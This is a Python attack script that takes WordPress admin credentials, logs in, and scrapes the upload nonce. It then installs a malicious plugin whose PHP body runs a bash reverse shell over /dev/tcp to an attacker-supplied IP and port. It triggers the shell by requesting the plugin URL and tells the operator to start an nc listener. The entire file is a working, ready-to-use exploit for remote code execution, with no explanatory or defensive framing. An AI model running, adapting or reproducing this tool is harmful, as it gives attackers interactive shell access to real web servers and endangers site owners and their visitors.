from requests import Session
from argparse import ArgumentParser
from string import ascii_lowercase
from random import choice
from re import search
from os import remove
from zipfile import ZipFile
from urllib3 import disable_warnings, exceptions

disable_warnings(exceptions.InsecureRequestWarning)

def arguments():

    parser = ArgumentParser(
        description="Wordpress Malicious plugin upload",
        epilog="./app.py -t http://domain_name.com/wordpress -u User_Admin -p Pass -L 192.168.20.2 -P 4040"
        )
    
    parser.add_argument("-t", "--target", metavar="", type=str, help="Target URL")
    parser.add_argument("-u", "--username", metavar="", type=str, help="Wordpress Username")
    parser.add_argument("-p", '--password', metavar="", type=str, help="Wordpress Password")
    parser.add_argument("-L", "--lhost", metavar="", type=str, help="Attacker IP address")
    parser.add_argument("-P", "--lport", metavar="", type=int, help="Attacker LOCAL PORT")
    args = parser.parse_args()

    return args.target, args.username, args.password, args.lhost, args.lport


def logo():

    banner = "\n  /\/\   __ _| (_) ___(_) ___  _   _ ___\n"
    banner += " /    \ / _` | | |/ __| |/ _ \| | | / __|\n"
    banner += "/ /\/\ | (_| | | | (__| | (_) | |_| \__ \ \n"
    banner += "\/    \/\__,_|_|_|\___|_|\___/ \__,_|___/\n"
    banner += "            (Shell upload in WordPress plugin)\n"

    banner += "─────▄───▄\n"
    banner += "─▄█▄─█▀█▀█─▄█▄\n"
    banner += "▀▀████▄█▄████▀▀\n"
    banner += "─────▀█▀█▀\n"

    return banner


class Script:

    def __init__(self, host, lhost, lport):
        
        self.host, self.lhost, self.lport = host, lhost, lport
        
        self.payload = f"""<?php
        /**
        * Plugin Name: Reverse Shell Plugin
        * Plugin URI:
        * Description: Reverse Shell Plugin
        * Version: 1.0
        * Author: This is a copy, bruh
        * Author URI: http://www.sevenlayers.com
        */
        exec("/bin/bash -c 'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1'");
        ?>"""

        self.nonce_pattern = 'value="[0-9a-z]{10}"'                                      
        self.headers = {'user-agent': "Linux Mozilla 5/0", 'Accept-Encoding' : 'none'}
        self.shell_directory = (''.join(choice(ascii_lowercase) for i in range(7)))
        self.activate_shell = f"{self.host}/wp-content/plugins/{self.shell_directory}/shell.php"


    def Upload_plugin(self, session, nonce):

        f = open("shell.php", "w")
        f.write(self.payload)
        f.close()
        ZIP = ZipFile("rev.zip", 'w')
        ZIP.write("shell.php")
        ZIP.close()

        remove("shell.php")

        file = {
            "pluginzip": (self.shell_directory+".zip", open("rev.zip", "rb")),
            'install-plugin-submit': (None,'Install Now'),
            '_wpnonce': (None, nonce),
            '_wp_http_referer': (None, self.host + '/wp-admin/plugin-install.php?tab=upload'),
            'install-plugin-submit': (None,'Install Now')
        }

        print("***" * 15)
        print("[+] Uploading Malicious Plugin...")
        print("***" * 15 + "\n")

        try:
            session.post(
                url=self.host + "/wp-admin/update.php?action=upload-plugin",
                files=file,
                headers=self.headers,
                verify=False,
                timeout=30
            )
            remove("rev.zip")

        except Exception:

            remove("rev.zip")
            print("\x1b[1;37m[✓] Plugin installed successfully\x1b[0m\n")
            print("[!] If you don't get the shell connection, manually trigger the URL:\n")
            print("***" * 20)
            print(self.activate_shell)
            print("***" * 20 + "\n")

    
    def exploit(self, session):

        find_install_dir = session.get(
            url=self.host + "/wp-admin/plugin-install.php?tab=upload",
            headers=self.headers,
            verify=False,
            timeout=35
        )

        if find_install_dir.status_code == 200:

            try:
                search_nonce = search(self.nonce_pattern, find_install_dir.text)
                last = search("[0-9a-z]{10}", search_nonce.group(0))
                nonce = last.group(0)

                self.Upload_plugin(session,nonce)
                print("Enjoy your shell :)\n")
                session.get(url=self.activate_shell, verify=False, timeout=30)

            except AttributeError:
                print("[!] Remove the characters after forward slash: '/' or check the URL" + "\n")
                exit()

        else:
            print("===" * 15)
            print("\n[X] Could not find <plugin-install.php> in the target dashboard?!\n")


    def login(self, username, password):

        session = Session()

        try:
            if session.get(url=self.host + "/wp-login.php").status_code == 200:
                try_login = session.post(

                    url=self.host + "/wp-login.php",
                    data={"log": username, "pwd": password, 'redirect_to': self.host + '/wp-admin/'},
                    headers=self.headers,
                    allow_redirects=False,
                    verify=False,
                    timeout=12
                )

                if "The password you entered for the username" not in try_login.text \
                    and "is not registered on this site." not in try_login.text:

                        print("===" * 20)
                        print("[+] Logged in successfully (preparing to upload...)")
                        print("===" * 20 + "\n")
                        print("---" * 15)
                        print("[+] Creating Plugin...")
                        print("---" * 15 + "\n")

                        return self.exploit(session)
                else:
                    print("===" * 15)
                    return "\n[X] Login Failed! Check the Credentials\n"

            else:
                return "\n[X] Could not find the login page?!\n"

        except TimeoutError:
            print("===" * 15)
            return "\n[?] Could not connect to the target URL\n"


def main():

    host, username_value, password_value, lhost, lport = arguments()
    run = Script(host, lhost, lport)

    try:
        if host is not None and username_value is not None and password_value is not None \
            and lhost is not None and lport is not None:

            if host[-1] == "/":
                host = host[:-1]
            else:
                pass

            print(logo())
            print(f"[!] ---> execute [nc -lvp {lport}]\n")

            print("===" * 15)
            print("[+] Starting...")
            print("===" * 15 + "\n")
            print(run.login(username_value, password_value))

        else:
            print("\nUSAGE: python3 Malicious.py -t <TARGET IP OR DOMAIN> -u <USERNAME> -p <PASSWORD> -L <LOCAL IP> -P <LOCAL PORT>\n")

    except KeyboardInterrupt:
        print("\n[!] CTRL+C Detected! Program stoped\n")
        exit()
    except IOError:
        exit()


if __name__ == '__main__':
    main()
